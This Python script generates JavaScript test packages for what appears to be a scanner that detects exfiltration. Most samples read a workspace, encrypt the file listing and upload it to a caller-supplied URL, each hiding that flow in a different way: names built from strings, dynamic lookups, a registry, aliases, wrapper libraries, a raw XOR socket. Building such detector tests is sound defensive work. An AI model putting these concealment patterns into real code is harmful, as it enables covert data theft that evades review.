# -*- coding: utf-8 -*-
"""P0 Discovery Boundary Matrix 样本生成。

三组：
  D0–D8   同一行为（读工作区 → 加密 → 上传），逐级替换**表达形式**
  B1–B4   控制组 B：different behavior, same spelling（测 semantic precision）
  V0–V7   Transformation invariance：语义等价的不同写法

所有 D 变体的**行为完全等价**，只有写法不同。
"""

import os

ROOT = str(__import__("pathlib").Path(__file__).resolve().parents[2] / "tests" / "dogfood" / "p0-boundary")

HEAD = """'use strict';
const fs = require('fs');
const crypto = require('crypto');
%s
function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}
"""


def w(sub, body, extra_files=None):
    d = os.path.join(ROOT, sub, "src")
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "index.js"), "w", encoding="utf-8") as f:
        f.write(body.lstrip("\n"))
    with open(os.path.join(ROOT, sub, "package.json"), "w", encoding="utf-8") as f:
        f.write('{"name":"%s","version":"1.0.0","main":"src/index.js"}\n' % sub)
    for name, content in (extra_files or {}).items():
        p = os.path.join(d, name)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w", encoding="utf-8") as f:
            f.write(content.lstrip("\n"))


# ============================================================ D0–D8
# 共同行为：读工作区 → AES 加密 → POST 到 oss

D0 = """
// D0 标准 API：全部直调，不含任何包装
async function sync(root, url) {
  const files = treescan(root);
  const key = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const body = Buffer.concat([iv, cipher.update(Buffer.from(files.join('\\n'))), cipher.final()]);
  return fetch(url, { method: 'POST', body: body });
}
module.exports = { sync };
"""

D1 = """
// D1 自定义 wrapper：外层自造名，但**内部仍调标准 API**
function sealEverything(buf) {
  const k = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-gcm', k, iv);
  return Buffer.concat([iv, c.update(buf), c.final()]);
}
async function shipIt(url, payload) {
  return fetch(url, { method: 'POST', body: payload });
}
async function sync(root, url) {
  return shipIt(url, sealEverything(Buffer.from(treescan(root).join('\\n'))));
}
module.exports = { sync };
"""

D2 = """
// D2 wrapper + 常规 API 混用：加密包起来，上传直调
function wrapSeal(buf) {
  const k = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-gcm', k, iv);
  return Buffer.concat([iv, c.update(buf), c.final()]);
}
async function sync(root, url) {
  const sealed = wrapSeal(Buffer.from(treescan(root).join('\\n')));
  return fetch(url, { method: 'POST', body: sealed });
}
module.exports = { sync };
"""

D3 = """
// D3 完全自定义 primitive：自造变换 + net 直连（与 E1/E4 同级）
function knead(buf, salt) {
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ salt[i % salt.length];
  return out;
}
function shunt(node, payload) {
  const s = require('net').connect({ host: node.apex, port: node.dock });
  s.on('connect', () => { s.end(payload); });
}
async function sync(root, node) {
  const b = Buffer.from(treescan(root).join('\\u0000'));
  shunt(node, knead(b, Buffer.from([5, 1, 9])));
}
module.exports = { sync };
"""

D4 = """
// D4 字符串拼接 API 名：运行时拼出方法名
async function sync(root, url) {
  const f = treescan(root);
  const mod = require('cry' + 'pto');
  const k = mod.randomBytes(32), iv = mod.randomBytes(16);
  const c = mod['create' + 'Cipher' + 'iv']('aes-256-gcm', k, iv);
  const body = Buffer.concat([iv, c.update(Buffer.from(f.join('\\n'))), c.final()]);
  const net = require('und' + 'ici');
  return net['fe' + 'tch'](url, { method: 'POST', body: body });
}
module.exports = { sync };
"""

D5 = """
// D5 动态属性调用：方法名来自变量
async function sync(root, url) {
  const f = treescan(root);
  const m = require('crypto');
  const encName = ['create', 'Cipher', 'iv'].join('');
  const k = m.randomBytes(32), iv = m.randomBytes(16);
  const c = m[encName]('aes-256-gcm', k, iv);
  const body = Buffer.concat([iv, c.update(Buffer.from(f.join('\\n'))), c.final()]);
  const sendName = ['fe', 'tch'].join('');
  const g = globalThis[sendName];
  return g(url, { method: 'POST', body: body });
}
module.exports = { sync };
"""

D6 = """
// D6 注册表 / 配置驱动：方法名存在表里，运行时查表
const REGISTRY = {
  makeCipher: 'createCipheriv',
  randomSource: 'randomBytes',
  transport: 'fetch',
};
async function sync(root, url) {
  const f = treescan(root);
  const m = require('crypto');
  const k = m[REGISTRY.randomSource](32), iv = m[REGISTRY.randomSource](16);
  const c = m[REGISTRY.makeCipher]('aes-256-gcm', k, iv);
  const body = Buffer.concat([iv, c.update(Buffer.from(f.join('\\n'))), c.final()]);
  return globalThis[REGISTRY.transport](url, { method: 'POST', body: body });
}
module.exports = { sync };
"""

D7 = """
// D7 间接 import / alias：先把标准 API 取成别名再用
const rnd = require('crypto').randomBytes;
const mkCipher = require('crypto').createCipheriv;
const send = require('undici').fetch;
async function sync(root, url) {
  const f = treescan(root);
  const k = rnd(32), iv = rnd(16);
  const c = mkCipher('aes-256-gcm', k, iv);
  const body = Buffer.concat([iv, c.update(Buffer.from(f.join('\\n'))), c.final()]);
  return send(url, { method: 'POST', body: body });
}
module.exports = { sync };
"""

D8 = """
// D8 库封装层：引入一个"自造库"，由它内部完成一切
const vault = require('../lib/vault');
async function sync(root, url) {
  return vault.stow(url, treescan(root));
}
module.exports = { sync };
"""

VAULT = """
// 自造"库"：对外只暴露 stow()，内部用标准 API
'use strict';
const fs = require('fs');
const crypto = require('crypto');
function seal(buf) {
  const k = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-gcm', k, iv);
  return Buffer.concat([iv, c.update(buf), c.final()]);
}
async function stow(url, files) {
  return fetch(url, { method: 'POST', body: seal(Buffer.from(files.join('\\n'))) });
}
module.exports = { stow };
"""

for name, body in (("d0-standard", D0), ("d1-wrapper", D1), ("d2-wrapper-partial", D2),
                   ("d3-custom-primitive", D3), ("d4-string-built-name", D4),
                   ("d5-dynamic-property", D5), ("d6-registry-driven", D6),
                   ("d7-alias", D7), ("d8-lib-encapsulated", D8)):
    extra = {"../lib/vault.js": VAULT} if name == "d8-lib-encapsulated" else None
    w(name, HEAD % "" + body, extra)

# ============================================================ 控制组 B
# different behavior, same spelling：都出现 createCipheriv，但语义完全不同

w("b1-real-user-data", HEAD % "" + """
// B1 真正加密用户数据并外发（对照：这才是真正的能力）
async function sync(root, url) {
  const files = treescan(root);
  const key = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-gcm', key, iv);
  const body = Buffer.concat([iv, c.update(Buffer.from(files.join('\\n'))), c.final()]);
  return fetch(url, { method: 'POST', body: body });
}
module.exports = { sync };
""")

w("b2-test-only", HEAD % "" + """
// B2 只在测试代码里用 createCipheriv，生产路径完全不加密不外发
function encodeFixture(s) {
  const k = Buffer.alloc(32, 1), iv = Buffer.alloc(16, 2);
  const c = crypto.createCipheriv('aes-256-gcm', k, iv);
  return Buffer.concat([iv, c.update(Buffer.from(s)), c.final()]);
}
function sync(root) { return treescan(root).length; }   // 只有本地统计
module.exports = { sync, encodeFixture };
""")

w("b3-local-cache-only", HEAD % "" + """
// B3 加密后写本地文件，**不联网**
function saveCache(p, data) {
  const k = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-gcm', k, iv);
  fs.writeFileSync(p, Buffer.concat([iv, c.update(data), c.final()]));
}
module.exports = { saveCache };
""")

w("b4-sdk-internal", HEAD % "" + """
// B4 看起来像 SDK 内部实现：createCipheriv 只出现在一个通用工具函数里
function genericTransform(algo, key, iv, buf) {
  const c = crypto.createCipheriv(algo, key, iv);
  return Buffer.concat([c.update(buf), c.final()]);
}
function hexDigest(buf) { return crypto.createHash('sha256').update(buf).digest('hex'); }
module.exports = { genericTransform, hexDigest };
""")

# ============================================================ V0–V7 变换不变性
V_BASE = """
// %s
%s
async function sync(root, url) {
%s
}
module.exports = { sync };
"""

V0 = V_BASE % ("V0 direct", "// 直写",
               "  const f = treescan(root).join('\\n');\n"
               "  const k = crypto.randomBytes(32), iv = crypto.randomBytes(16);\n"
               "  const c = crypto.createCipheriv('aes-256-gcm', k, iv);\n"
               "  const b = Buffer.concat([iv, c.update(Buffer.from(f)), c.final()]);\n"
               "  return fetch(url, { method: 'POST', body: b });")

V1 = V_BASE % ("V1 wrapper", "function seal(b){const k=crypto.randomBytes(32),i=crypto.randomBytes(16);"
               "const c=crypto.createCipheriv('aes-256-gcm',k,i);"
               "return Buffer.concat([i,c.update(b),c.final()]);}",
               "  return fetch(url, { method: 'POST', body: seal(Buffer.from(treescan(root).join('\\n'))) });")

V2 = V_BASE % ("V2 renamed", "// 变量与常量全部改名（不影响行为）",
               "  const L = treescan(root).join('\\n');\n"
               "  const K1 = crypto.randomBytes(32), K2 = crypto.randomBytes(16);\n"
               "  const CN = crypto.createCipheriv('aes-256-gcm', K1, K2);\n"
               "  const BB = Buffer.concat([K2, CN.update(Buffer.from(L)), CN.final()]);\n"
               "  return fetch(url, { method: 'POST', body: BB });")

V3 = V_BASE % ("V3 helper split", "function gather(r){return treescan(r).join('\\n');}"
               "function keypair(){return [crypto.randomBytes(32),crypto.randomBytes(16)];}"
               "function wrap(k,i,b){const c=crypto.createCipheriv('aes-256-gcm',k,i);"
               "return Buffer.concat([i,c.update(b),c.final()]);}",
               "  const [k, i] = keypair();\n"
               "  const b = wrap(k, i, Buffer.from(gather(root)));\n"
               "  return fetch(url, { method: 'POST', body: b });")

V4 = V_BASE % ("V4 reordered", "// 语句顺序调换",
               "  const k = crypto.randomBytes(32), iv = crypto.randomBytes(16);\n"
               "  const c = crypto.createCipheriv('aes-256-gcm', k, iv);\n"
               "  const f = treescan(root).join('\\n');\n"
               "  const b = Buffer.concat([iv, c.update(Buffer.from(f)), c.final()]);\n"
               "  return fetch(url, { method: 'POST', body: b });")

V5 = V_BASE % ("V5 minified", "// 压成单行",
               "  const f=treescan(root).join('\\n'),k=crypto.randomBytes(32),i=crypto.randomBytes(16),"
               "c=crypto.createCipheriv('aes-256-gcm',k,i),b=Buffer.concat([i,c.update(Buffer.from(f)),c.final()]);"
               "return fetch(url,{method:'POST',body:b});")

V6 = V_BASE % ("V6 alias", "const rb = crypto.randomBytes; const cc = crypto.createCipheriv;"
               "const ft = fetch;",
               "  const k = rb(32), iv = rb(16);\n"
               "  const c = cc('aes-256-gcm', k, iv);\n"
               "  const b = Buffer.concat([iv, c.update(Buffer.from(treescan(root).join('\\n'))), c.final()]);\n"
               "  return ft(url, { method: 'POST', body: b });")

V7 = V_BASE % ("V7 function-pointer", "// 通过变量间接调用",
               "  const enc = crypto.createCipheriv, rnd = crypto.randomBytes, post = fetch;\n"
               "  const k = rnd(32), iv = rnd(16);\n"
               "  const c = enc('aes-256-gcm', k, iv);\n"
               "  const b = Buffer.concat([iv, c.update(Buffer.from(treescan(root).join('\\n'))), c.final()]);\n"
               "  return post(url, { method: 'POST', body: b });")

for name, body in (("v0-direct", V0), ("v1-wrapper", V1), ("v2-renamed", V2),
                   ("v3-helper-split", V3), ("v4-reordered", V4), ("v5-minified", V5),
                   ("v6-alias", V6), ("v7-function-pointer", V7)):
    w(name, HEAD % body)

print("P0 样本生成完成：")
for grp in ("d", "b", "v"):
    subs = sorted(x for x in os.listdir(ROOT) if x.startswith(grp))
    print("  %s*: %d 个 — %s" % (grp.upper(), len(subs), ", ".join(subs)))
